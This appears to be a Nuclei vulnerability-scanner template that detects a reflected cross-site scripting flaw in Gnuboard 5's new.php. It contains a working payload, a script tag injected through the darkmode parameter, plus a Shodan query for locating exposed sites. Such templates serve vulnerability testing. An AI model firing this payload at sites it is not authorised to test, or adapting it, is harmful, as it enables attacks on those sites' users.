id: gnuboard5-xss

info:
  name: Gnuboard5 - Cross Site Scripting
  author: arafatansari
  severity: medium
  description: |
    Gnuboard 5 is vulnerable to reflected XSS to a flaw in the clean_xss_tags() function called in new.php.
  reference:
    - https://huntr.dev/bounties/ad2a9b32-fe6c-43e9-9b05-2c77c58dde6a/
  metadata:
    shodan-query: http.html:"gnuboard5"
    verified: "true"
  tags: xss, gnuboard

requests:
  - raw:
      - |
        GET /bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '<script>alert(document.domain)</script>'
